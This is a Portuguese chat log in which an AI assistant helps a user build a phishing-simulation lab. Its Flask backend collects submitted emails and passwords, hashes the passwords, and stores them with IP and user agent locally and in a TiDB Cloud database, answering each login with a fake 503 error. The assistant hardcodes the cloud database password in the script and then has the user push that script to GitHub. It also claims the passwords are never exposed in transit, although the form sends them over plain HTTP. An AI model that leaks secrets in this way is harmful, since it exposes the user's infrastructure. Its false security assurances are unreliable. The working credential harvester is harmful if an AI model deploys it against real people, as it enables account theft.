Execute o bloco abaixo no terminal da sua VM:

Bash
cat << 'EOF' > ~/LabSec-PhishSim/src/backend/capture_server.py
import os
import datetime
import hashlib
from flask import Flask, request
import pymysql

app = Flask(__name__)

# Caminho para o arquivo de log local (Redundância Forense)
LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')

# Configurações de conexão segura com o TiDB Cloud
TIDB_CONFIG = {
    'host': 'gateway01.us-east-1.prod.aws.tidbcloud.com',
    'port': 4000,
    'user': '2ekNitjymau1dcX.root',
    'password': '4k6IIcI6qLl8UfjS',
    'database': 'labsec_db',
    'ssl': {
        'ca': '/etc/ssl/certs/ca-certificates.crt'  # Caminho padrão do certificado CA no Ubuntu
    },
    'connect_timeout': 5  # Timeout para não travar o Flask se a internet falhar
}

def registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Garante a persistência local em formato de arquivo texto estruturado."""
    log_line = (
        f"[{timestamp}] IP_ORIGEM: {ip_origem} | "
        f"USUARIO_ALVO: {email} | "
        f"CREDENTIAL_HASH(SHA256): {pwd_hash} | "
        f"NAV_INFO: {user_agent}\n"
    )
    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:
        f.write(log_line)

def registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Envia os metadados anonimizados via TLS para o cluster TiDB na nuvem."""
    conexao = None
    try:
        conexao = pymysql.connect(**TIDB_CONFIG)
        with conexao.cursor() as cursor:
            # Insere os dados na tabela estruturada
            sql = """
                INSERT INTO auditoria_acessos (timestamp, usuario_alvo, credential_hash_sha256, ip_origem, user_agent)
                VALUES (%s, %s, %s, %s, %s)
            """
            cursor.execute(sql, (timestamp, email, pwd_hash, ip_origem, user_agent))
        conexao.commit()
        print(f" -> Persistência em Nuvem (TiDB Cloud): OK")
    except Exception as e:
        print(f" -> Falha de contingência na nuvem: {e}")
    finally:
        if conexao:
            conexao.close()

@app.route('/login', methods=['POST'])
def login():
    # Coleta e higienização dos metadados recebidos
    email = request.form.get('email', 'Desconhecido')
    password_raw = request.form.get('password', '')
    
    ip_origem = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    
    # Tratamento Criptográfico (Security by Design)
    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    print(f"\n[!] Requisição capturada de {ip_origem} - Processando logs...")
    
    # Executa ambas as rotinas de persistência (Local + Nuvem)
    registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent)
    registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent)
    
    # Retorno de pretexting (Simulação de indisponibilidade)
    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503

if __name__ == '__main__':
    print("=========================================================")
    print(" LabSec-PhishSim - Motor de Auditoria c/ TiDB Cloud       ")
    print(" Escutando no endereço: http://0.0.0.0:5000              ")
    print("=========================================================")
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
🚀 Passo 3: Executar o Laboratório e Testar
Agora, vamos iniciar o servidor de auditoria com a nova integração ativa:

Bash
cd ~/LabSec-PhishSim/src/backend
python3 capture_server.py
Quando o servidor iniciar, submeta o formulário HTML novamente a partir do navegador do seu Windows. O seu terminal do Ubuntu mostrará uma saída parecida com esta:

Plaintext
[!] Requisição capturada de 192.168.204.1 - Processando logs...
 -> Persistência em Nuvem (TiDB Cloud): OK
Nota: Se o console acusar erro informando que a tabela auditoria_acessos ou o banco labsec_db não existem, avise-me que criamos a query de inicialização automática dele no Python.

ESTA correto:marcio@labsec-service:~/LabSec-PhishSim/src/frontend$ source ~/LabSec-PhishSim/venv/bin/activate

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/frontend$ pip install pymysql

Collecting pymysql

  Downloading pymysql-1.2.0-py3-none-any.whl.metadata (4.3 kB)

Downloading pymysql-1.2.0-py3-none-any.whl (45 kB)

Installing collected packages: pymysql

Successfully installed pymysql-1.2.0

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/frontend$?

Sim, Márcio! Está absolutamente correto. 🚀

O seu terminal mostra exatamente o comportamento esperado de um ambiente Linux bem configurado:

source ~/LabSec-PhishSim/venv/bin/activate: Você ativou com sucesso o ambiente virtual. O prefixo (venv) que apareceu no início da linha comprova que o terminal agora está isolado.

pip install pymysql: O gerenciador de pacotes do Python baixou a versão mais recente do driver (pymysql-1.2.0) e a instalou de forma limpa dentro desse ambiente isolado.

O fato de você estar na pasta src/frontend no momento da instalação não quebra nada, pois o pip instala a biblioteca globalmente dentro da pasta venv (que fica na raiz), tornando-a acessível para qualquer script Python que você rodar com esse ambiente ativo.

Próximo Passo
Agora que o driver de comunicação com o TiDB está instalado, você só precisa entrar na pasta do backend e iniciar o servidor atualizado:

Bash
# 1. Mudar para a pasta do backend
cd ../backend

# 2. Executar o motor de auditoria integrado à nuvem
python3 capture_server.py
Assim que ele iniciar, você já pode fazer um teste submetendo o formulário index.html no seu navegador Windows!

ok, abri uma aba no meu windows e coloquei:http://192.168.204.131, abriu o html

Perfeito, Márcio! Isso significa que o seu Nginx na VM Ubuntu está configurado corretamente e servindo a página index.html com sucesso para a rede interna.

Agora, a estrutura do seu laboratório está completamente funcional e integrada de ponta a ponta.

🧪 Como fazer o teste final de captura agora:
Na aba do navegador do seu Windows (onde o HTML está aberto), preencha o formulário com dados de teste.

Clique no botão de envio (Login).

📊 O que observar após o clique:
No Navegador (Windows): A página deve carregar e exibir a mensagem de erro simulada que você programou:

Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.

(Isso valida que o Pretexting técnico funcionou perfeitamente e o usuário comum achará que é apenas uma falha na rede).

No Terminal do Ubuntu (onde o capture_server.py está rodando): Você verá o motor de auditoria interceptar a requisição síncrona do formulário em tempo real e exibir a mensagem de confirmação:

Plaintext
[!] Requisição capturada de 192.168.204.1 - Processando logs...
 -> Persistência em Nuvem (TiDB Cloud): OK
Pode fazer o envio dos dados no formulário! Deixe o terminal da VM visível para acompanhar o exato momento em que o Flask captura os metadados e faz o upload do hash criptográfico para o seu cluster distribuído no TiDB Cloud. Me conte se a mensagem apareceu com sucesso!

eu acho que não vai aparecer isso ainda pois não foi alterado nenhum codigo ainda:(venv) marcio@labsec-service:~/LabSec-PhishSim/src/frontend$ cd ../backend

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 capture_server.py

=========================================================

 LabSec-PhishSim - Motor de Auditoria Iniciado           

 Escutando no endereço: http://0.0.0.0:5000              

=========================================================

 * Serving Flask app 'capture_server'

 * Debug mode: off

WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.

 * Running on all addresses (0.0.0.0)

 * Running on http://127.0.0.1:5000

 * Running on http://192.168.204.131:5000

Press CTRL+C to quit

192.168.204.1 - - [01/Jun/2026 01:57:04] "POST /login HTTP/1.1" 503 -

192.168.204.1 - - [01/Jun/2026 01:57:04] "POST /login HTTP/1.1" 503 -

192.168.204.1 - - [01/Jun/2026 01:57:05] "GET /favicon.ico HTTP/1.1" 404 -

Você tem toda a razão, Márcio! Peço desculpas pela nossa falha de sincronia. Como você bem observou pelo cabeçalho no terminal (LabSec-PhishSim - Motor de Auditoria Iniciado), o script que rodou ainda é a versão antiga (V1), que apenas grava o log local e simula o erro 503, sem tentar conexão com a nuvem.

O envio do formulário funcionou (bateu o POST /login com status 503), mas para a mágica do TiDB Cloud acontecer, precisamos atualizar o código do capture_server.py com as credenciais que você gerou.

Vamos fazer isso agora de forma limpa e direta.

🛠️ Como injetar o código novo do TiDB na sua VM
Pare o servidor atual apertando Ctrl + C no terminal.

Copie todo o bloco de comando abaixo, cole no seu terminal do Ubuntu e aperte Enter. Ele vai sobrescrever o arquivo antigo com o script novo automaticamente:

Bash
cat << 'EOF' > ~/LabSec-PhishSim/src/backend/capture_server.py
import os
import datetime
import hashlib
from flask import Flask, request
import pymysql

app = Flask(__name__)

# Caminho para o arquivo de log local (Redundância Forense)
LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')

# Configurações de conexão segura com o TiDB Cloud que você forneceu
TIDB_CONFIG = {
    'host': 'gateway01.us-east-1.prod.aws.tidbcloud.com',
    'port': 4000,
    'user': '2ekNitjymau1dcX.root',
    'password': '4k6IIcI6qLl8UfjS',
    'database': 'labsec_db',
    'ssl': {
        'ca': '/etc/ssl/certs/ca-certificates.crt'  # Certificado CA nativo do Ubuntu
    },
    'connect_timeout': 5
}

def registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Garante a persistência local em formato de arquivo texto estruturado."""
    log_line = (
        f"[{timestamp}] IP_ORIGEM: {ip_origem} | "
        f"USUARIO_ALVO: {email} | "
        f"CREDENTIAL_HASH(SHA256): {pwd_hash} | "
        f"NAV_INFO: {user_agent}\n"
    )
    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:
        f.write(log_line)

def registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Envia os metadados anonimizados via TLS para o cluster TiDB na nuvem."""
    conexao = None
    try:
        conexao = pymysql.connect(**TIDB_CONFIG)
        with conexao.cursor() as cursor:
            # Garante que a tabela exista antes de inserir (Evita falha se o banco estiver vazio)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS auditoria_acessos (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    timestamp VARCHAR(25),
                    usuario_alvo VARCHAR(255),
                    credential_hash_sha256 CHAR(64),
                    ip_origem VARCHAR(45),
                    user_agent TEXT
                );
            """)
            
            # Insere os dados na tabela estruturada
            sql = """
                INSERT INTO auditoria_acessos (timestamp, usuario_alvo, credential_hash_sha256, ip_origem, user_agent)
                VALUES (%s, %s, %s, %s, %s)
            """
            cursor.execute(sql, (timestamp, email, pwd_hash, ip_origem, user_agent))
        conexao.commit()
        print(f" -> Persistência em Nuvem (TiDB Cloud): OK")
    except Exception as e:
        print(f" -> Falha de contingência na nuvem: {e}")
    finally:
        if conexao:
            conexao.close()

@app.route('/login', methods=['POST'])
def login():
    # Coleta e higienização dos metadados recebidos
    email = request.form.get('email', 'Desconhecido')
    password_raw = request.form.get('password', '')
    
    ip_origem = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    
    # Tratamento Criptográfico (Security by Design)
    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    print(f"\n[!] Requisição capturada de {ip_origem} - Processando logs...")
    
    # Executa ambas as rotinas de persistência (Local + Nuvem)
    registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent)
    registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent)
    
    # Retorno de pretexting (Simulação de indisponibilidade)
    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503

if __name__ == '__main__':
    print("=========================================================")
    print(" LabSec-PhishSim - Motor de Auditoria c/ TiDB Cloud       ")
    print(" Escutando no endereço: http://0.0.0.0:5000              ")
    print("=========================================================")
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
🚀 Agora sim, o teste oficial
Com o arquivo devidamente alterado, execute o comando para iniciar o novo motor:

Bash
python3 capture_server.py
Repare que agora o cabeçalho inicial vai exibir Motor de Auditoria c/ TiDB Cloud. Assim que ele estiver rodando, volte no navegador do seu Windows, atualize a página e clique em enviar novamente!

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 capture_server.py

=========================================================

 LabSec-PhishSim - Motor de Auditoria c/ TiDB Cloud       

 Escutando no endereço: http://0.0.0.0:5000              

=========================================================

 * Serving Flask app 'capture_server'

 * Debug mode: off

WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.

 * Running on all addresses (0.0.0.0)

 * Running on http://127.0.0.1:5000

 * Running on http://192.168.204.131:5000

Press CTRL+C to quit



[!] Requisição capturada de 192.168.204.1 - Processando logs...



[!] Requisição capturada de 192.168.204.1 - Processando logs...

 -> Persistência em Nuvem (TiDB Cloud): OK

192.168.204.1 - - [01/Jun/2026 02:02:24] "POST /login HTTP/1.1" 503 -

 -> Persistência em Nuvem (TiDB Cloud): OK

192.168.204.1 - - [01/Jun/2026 02:02:24] "POST /login HTTP/1.1" 503 -

Sensacional, Márcio! Vitória total! 🏆🚀

Veja que conquista técnica fantástica para o seu laboratório:

O seu servidor Flask interceptou a requisição vinda do Windows (192.168.204.1).

Ele gerou o hash SHA-256 e salvou no arquivo de log local do Linux (tentativas_acesso.log).

E o principal: Ele abriu uma conexão criptografada via TLS, atravessou a internet e persistiu os metadados com sucesso dentro do seu cluster distribuído no TiDB Cloud (-> Persistência em Nuvem (TiDB Cloud): OK).

Com isso, o seu motor de auditoria agora opera de forma híbrida e resiliente, seguindo padrões reais de arquitetura corporativa (Security by Design). Mesmo que a sua máquina virtual dê algum problema ou seja deletada, o histórico forense das simulações está guardado em segurança na nuvem do TiDB.

🕵️‍♂️ Como validar os dados direto no painel do TiDB Cloud
Se você quiser ver as linhas físicas com os hashes que acabamos de capturar, você pode olhar direto pelo navegador no painel da PingCAP:

Acesse o console do TiDB Cloud e faça login.

Entre no seu Cluster (Serverless).

No menu lateral esquerdo, procure por Chat2Query ou SQL Editor.

Selecione o banco de dados labsec_db e execute a seguinte consulta SQL:

SQL
SELECT * FROM auditoria_acessos;
Você verá a tabela preenchida com as colunas que criamos (id, timestamp, usuario_alvo, credential_hash_sha256, ip_origem, user_agent), mostrando exatamente os testes síncronos que você acabou de disparar da sua rede local para a nuvem!

O laboratório está 100% integrado e funcional. Como quer prosseguir agora? Quer atualizar o README.md no seu GitHub para documentar essa arquitetura com o TiDB, ou quer fazer mais algum teste de envio?

id

timestamp

usuario_alvo

credential_hash_sha256

ip_origem

user_agent

1

2026-06-01 02:02:22

catharina_psilva@globalcorp.com

89e5d2c5e28994c0f563e2706d6d32c6a192686736eae99208cd1c40ff8b0293

192.168.204.1

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

2

2026-06-01 02:02:22

catharina_psilva@globalcorp.com

89e5d2c5e28994c0f563e2706d6d32c6a192686736eae99208cd1c40ff8b0293

192.168.204.1

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

3

2026-06-01 02:07:03

pillar_pereirasilva@globalcorp.com

0dc67c5310556079589f0af8aa65b365ad1a39057a4ef4f59504c05a85d755a1

192.168.204.1

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

Ver esses dados consolidados direto da tabela do TiDB Cloud é a coroação do sucesso desse laboratório, Márcio! Muito bacana ver o resultado limpo e estruturado em nuvem.

Analisando as linhas capturadas (IDs 1, 2 e 3), do ponto de vista de segurança, o seu ecossistema simulou perfeitamente um cenário real de auditoria e resposta a incidentes. Note os seguintes pontos técnicos:

Garantia de Privacidade (Data Protection): Os hashes SHA-256 (89e5d2c5... e 0dc67c53...) provam que o motor capturou a submissão das credenciais, mas o dado sensível (a senha original) não ficou exposto em texto claro nem no trânsito e nem no banco de dados.

Duplo Clique Detectado (IDs 1 e 2): O exato mesmo timestamp (02:02:22) e usuário mostram um comportamento comum de usuários finais: clicar duas vezes seguidas no botão de submissão do formulário devido ao delay do erro 503 simulado pelo Flask.

Mapeamento de Metadados: O ip_origem (192.168.204.1) e o user_agent isolam perfeitamente o vetor do host atacado (sua máquina Windows operando o navegador Chrome).

🚀 Atualização Estratégica do GitHub
Como o banco em nuvem está operando com sucesso total e os dados estão sendo devidamente catalogados, o passo ideal agora é commitar e subir essas alterações para o seu repositório remoto. Isso vai atualizar o seu portfólio no GitHub com essa arquitetura NewSQL distribuída.

Execute estes comandos na sua VM para salvar o progresso:

Bash
# 1. Garanta que está na pasta raiz do repositório
cd ~/LabSec-PhishSim

# 2. Adicione as modificações do capture_server.py e do README.md
git add src/backend/capture_server.py README.md

# 3. Crie o commit documentando a evolução da arquitetura
git commit -m "feat: integra motor de auditoria ao banco de dados distribuído TiDB Cloud via TLS"

# 4. Envie as alterações para o GitHub
git push origin main
(Caso você use o utilitário gh ou precise se autenticar, o terminal solicitará as credenciais normais do seu perfil).

Com o código e a documentação na nuvem, o projeto ganha uma maturidade de design excelente. Deseja realizar mais alguma melhoria no motor de logs ou o foco agora será a evolução do design da página de simulação no front-end?

(venv) marcio@labsec-service:~/LabSec-PhishSim$ git push origin main

To https://github.com/marciosouzagcm/LabSec-PhishSim.git

 ! [rejected]        main -> main (fetch first)

error: failed to push some refs to 'https://github.com/marciosouzagcm/LabSec-PhishSim.git'

hint: Updates were rejected because the remote contains work that you do not

hint: have locally. This is usually caused by another repository pushing to

hint: the same ref. If you want to integrate the remote changes, use

hint: 'git pull' before pushing again.

hint: See the 'Note about fast-forwards' in 'git push --help' for details.

Esse erro [rejected] main -> main (fetch first) acontece porque o seu repositório lá no GitHub tem alguma alteração (como um arquivo criado ou editado direto pelo site, por exemplo, o README.md antigo) que a sua máquina virtual local ainda não conhece.

O Git é bem rigoroso com isso: ele não deixa você empurrar (push) código novo antes de trazer para a sua máquina as alterações que estão lá em cima (pull).

Para resolver isso de forma segura, garantindo que o Git junte os históricos sem criar conflitos complexos, execute os seguintes passos no seu terminal:

🛠️ Como resolver o rejeite do Git
1. Faça o Pull configurando a estratégia de Rebase:
O comando abaixo traz as alterações do GitHub e "encaixa" os seus novos commits (do TiDB e do README) logo após o histórico que estava na nuvem, deixando a linha do tempo do Git limpa.

Bash
git pull origin main --rebase
2. Envie os dados atualizados para o GitHub:
Agora que o seu histórico local está perfeitamente alinhado com o servidor remoto, o comando de envio vai funcionar direto:

Bash
git push origin main
⚠️ O que fazer se o git pull reclamar do README?
Como nós editamos o arquivo README.md localmente, se o arquivo que estiver no GitHub também for o README.md, o Git pode parar o processo e dizer que há um conflito.

Se isso acontecer (o terminal vai avisar que o rebase falhou), me avise aqui o que apareceu no terminal que eu te ajudo a forçar a soberania do seu arquivo local de forma simples! Se passar direto, seu código já estará publicado.

deu certo , porem voce não havia atualizado meu arquivo README.md , pois acredito que voce queira colocar essa informação de que foi concluida a fase de colocar na nuvem o db: # LabSec-PhishSim 🛡️ 🚀



Um ambiente de simulação controlada de Engenharia Social (Phishing) desenvolvido para fins estritamente educacionais, acadêmicos e de conscientização em Segurança da Informação. O projeto integra conceitos de Redes, Sistemas Operacionais (Linux/Windows) e Criptografia Aplicada.



O ecossistema simula a captura de requisições de um formulário web corporativo, processa as entradas em tempo real através de um motor de auditoria e armazena os metadados de forma segura utilizando funções de resumo criptográfico.---## 🏗️ Arquitetura do Sistema e Fluxo de Dados



A infraestrutura é montada utilizando uma arquitetura híbrida de rede virtualizada via VMware, dividida em três camadas principais:1. **Front-End (Cenário de Pretexting):** Interface HTML/CSS que replica um portal de autenticação corporativo, servido localmente ou via Nginx.2. **Back-End (Motor de Auditoria):** Servidor Flask (Python) configurado no arquivo `capture_server.py` para escutar requisições de rede de forma síncrona na porta `5000`, interceptar dados de formulários e processar metadados do cliente (IP de Origem, User-Agent).3. **Camada de Persistência e Criptografia:** Aplicação de algoritmos de Hashing (SHA-256) sobre as credenciais recebidas, garantindo a privacidade dos dados antes do armazenamento nos logs locais (`tentativas_acesso.log`).### 🗺️ Próxima Fase: Expansão para a Nuvem

O projeto prevê a migração do armazenamento local para um modelo centralizado, onde o `capture_server.py` enviará os payloads anonimizados via TLS para um Banco de Dados na Nuvem (**MongoDB Atlas** ou **PostgreSQL**), aumentando a resiliência forense do ambiente.---## 🛠️ Tecnologias Utilizadas* **Sistema Operacional:** Ubuntu Server / Desktop (VMware)* **Back-End:** Python 3.x, Flask (Ambiente Virtual `venv`)* **Front-End:** HTML5, CSS3* **Segurança:** Hash SHA-256 (Biblioteca Nativa `hashlib`)* **Versionamento & Deploy:** Git & GitHub CLI (`gh`)---## 🗂️ Estrutura de Pastas Atualizada```textLabSec-PhishSim/├── venv/ # Ambiente virtual isolado do Python 3├── src/│ ├── frontend/│ │ └── index.html # Interface do formulário de simulação│ └── backend/│ ├── capture_server.py # Motor Flask e processamento de requisições│ └── logs/│ └── tentativas_acesso.log # Registro forense local (ignorado no Git)├── .gitignore # Proteção de ambiente virtual e logs locais└── README.md # Documentação técnica do projeto



🕵️‍♂️ Operação e Análise Forense de Logs



1. Monitoramento em Tempo Real



Para assistir as tentativas de acesso e capturas entrando no servidor Linux à medida que ocorrem no navegador, utilize o comando:

tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log



2. Anatomia do Log Estruturado



Cada entrada capturada gera um registro anonimizado conforme o padrão abaixo:

[2026-05-31 15:56:31] IP_ORIGEM: 192.168.204.1 | USUARIO_ALVO: teste@email.com | CREDENTIAL_HASH(SHA256): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 | NAV_INFO: Mozilla/5.0...



IP_ORIGEM: Identifica a máquina host (Windows) de onde partiu o clique.

CREDENTIAL_HASH(SHA256): Garante que a senha digitada nunca fique exposta em texto claro no servidor, aplicando os princípios de Security by Design.

🚀 Como Executar o Laboratório Localmente



1. Configurar o Ambiente Virtual e Dependências



Na pasta raiz do projeto (~/LabSec-PhishSim), inicialize o ambiente:

python3 -m venv venvsource venv/bin/activate

pip install flask



2. Iniciar o Servidor de Captura



Entre na pasta do back-end e execute o motor:

cd src/backend

python3 capture_server.py



Nota: O servidor responderá com um erro HTTP 503 simulado para o cliente após a coleta, agindo como um mecanismo de pretexting técnico.

3. Testar o Front-End



Abra o arquivo src/frontend/index.html no navegador do sistema hospedeiro (Windows) e certifique-se de que a tag <form action="..."> aponta para o IP correto da sua máquina virtual Ubuntu na porta 5000.

⚖️ Aviso Legal (Disclaimer)



Este projeto foi desenvolvido estritamente para fins de pesquisa acadêmica, testes de penetração autorizados e treinamento de conscientização de usuários. O uso deste código contra sistemas sem consentimento explícito e por escrito dos proprietários é ilegal e passível de penalidades jurídicas. O desenvolvedor não se responsabiliza pelo mau uso desta ferramenta.

Developed by Marcio Souza 💻

Tens toda a razão, Márcio! Como a fase de expansão para a nuvem foi concluída com sucesso total usando o TiDB Cloud (banco de dados NewSQL distribuído), a documentação precisa refletir essa maturidade arquitetural agora, em vez de tratar o banco como um plano futuro.

Aqui está o arquivo README.md atualizado e ajustado. Ele remove o status de "Próxima Fase" e consolida a integração do TiDB Cloud com persistência híbrida e criptografia TLS em trânsito.

Substitua o conteúdo do seu arquivo atual na VM por este bloco limpo:

Markdown
# LabSec-PhishSim 🛡️ 🚀

Um ambiente de simulação controlada de Engenharia Social (Phishing) desenvolvido para fins estritamente educacionais, acadêmicos e de conscientização em Segurança da Informação. O projeto integra conceitos avançados de Redes, Sistemas Operacionais (Linux/Windows), Banco de Dados Distribuído e Criptografia Aplicada.

O ecossistema simula a captura de requisições de um formulário web corporativo, processa as entradas em tempo real através de um motor de auditoria híbrido e armazena os metadados de forma segura utilizando funções de resumo criptográfico e persistência resiliente local e em nuvem.

---

## 🏗️ Arquitetura do Sistema e Fluxo de Dados

A infraestrutura é montada utilizando uma arquitetura síncrona e resiliente de rede virtualizada via VMware, dividida em três camadas principais:

1. **Front-End (Cenário de Pretexting):** Interface HTML/CSS que replica um portal de autenticação corporativo, servido localmente ou distribuído na rede pelo Nginx.
2. **Back-End (Motor de Auditoria):** Servidor Flask (Python) configurado no arquivo `capture_server.py` escutando requisições na porta `5000` de todas as interfaces de rede (`0.0.0.0`). Intercepta os dados do formulário e extrai os metadados do cliente (IP de Origem, User-Agent).
3. **Camada de Persistência Híbrida e Criptografia (*Security by Design*):** * **Tratamento de Dados:** Aplicação imediata do algoritmo de Hashing SHA-256 sobre as credenciais brutas, anonimizando a informação antes de qualquer armazenamento.
   * **Persistência Local:** Gravação redundante e estruturada do evento em arquivo físico local (`tentativas_acesso.log`).
   * **Persistência em Nuvem (Concluída):** Envio imediato dos metadados estruturados via canal criptografado TLS para um Cluster Serverless **TiDB Cloud** (NewSQL distribuído compatível com o protocolo MySQL), garantindo integridade forense e resiliência dos dados de auditoria.

---

## 🛠️ Tecnologias Utilizadas

* **Sistema Operacional:** Ubuntu Server / Desktop (VMware)
* **Banco de Dados em Nuvem:** TiDB Cloud Serverless (NewSQL Distribuído)
* **Back-End:** Python 3.x, Flask, PyMySQL (Ambiente Virtual `venv`)
* **Front-End:** HTML5, CSS3
* **Segurança:** Hash SHA-256 (`hashlib`) e Conexão Criptografada TLS
* **Versionamento & Deploy:** Git & GitHub CLI (`gh`)

---

## 🗂️ Estrutura de Pastas Atualizada

```text
LabSec-PhishSim/
├── venv/                       # Ambiente virtual isolado do Python 3
├── src/
│   ├── frontend/
│   │   └── index.html          # Interface do formulário de simulação
│   └── backend/
│       ├── capture_server.py   # Motor Flask c/ persistência local + TiDB Cloud
│       └── logs/
│           └── tentativas_acesso.log  # Registro forense local (ignorado no Git)
├── .gitignore                  # Proteção de ambiente virtual e logs locais
└── README.md                   # Documentação técnica do projeto atualizada
🕵️‍♂️ Operação e Análise Forense de Logs
1. Monitoramento Local em Tempo Real
Para assistir as tentativas de acesso e capturas entrando no servidor Linux à medida que ocorrem no navegador, utilize o comando:

Bash
tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log
2. Anatomia do Log e Dados Estruturados (SQL)
Os eventos disparados síncronos pelo formulário alimentam simultaneamente o arquivo local e a tabela auditoria_acessos no TiDB Cloud com a seguinte estrutura relacional:

id: Chave primária autoincrementável gerenciada pelo cluster em nuvem.

timestamp: Data e hora do acionamento técnico.

usuario_alvo: E-mail do alvo fictício submetido para o mapeamento de escopo.

credential_hash_sha256: Resumo de 64 caracteres hexadecimais que invalida o vazamento de credenciais em texto claro, mitigando riscos de privacidade.

ip_origem: Identifica de qual host físico (Windows) partiu a conexão na rede.

user_agent: Coleta dados de software do cliente para auditoria e análise de perfil do vetor de acesso.

🚀 Como Executar o Laboratório Localmente
1. Configurar o Ambiente Virtual e Dependências
Na pasta raiz do projeto (~/LabSec-PhishSim), inicialize e instale os pacotes necessários:

Bash
python3 -m venv venv
source venv/bin/activate
pip install flask pymysql
2. Iniciar o Servidor de Captura e Nuvem
Entre na pasta do back-end e execute o motor de auditoria:

Bash
cd src/backend
python3 capture_server.py
Nota: O servidor responderá com um erro HTTP 503 (Servidor Indisponível) fictício para o cliente após realizar com sucesso as gravações local e na nuvem, atuando como um mecanismo clássico de pretexting.

3. Testar o Front-End
Abra o arquivo src/frontend/index.html no navegador do sistema hospedeiro (Windows) apontando para o IP correto da sua máquina virtual Ubuntu na porta 5000 (ex: http://192.168.204.131:5000/login).

⚖️ Aviso Legal (Disclaimer)
Este projeto foi desenvolvido estritamente para fins de pesquisa acadêmica, testes de penetração autorizados e treinamento de conscientização de usuários. O uso deste código contra sistemas sem consentimento explícito e por escrito dos proprietários é ilegal e passível de penalidades jurídicas. O desenvolvedor não se responsabiliza pelo mau uso desta ferramenta.

Developed by Marcio Souza 💻
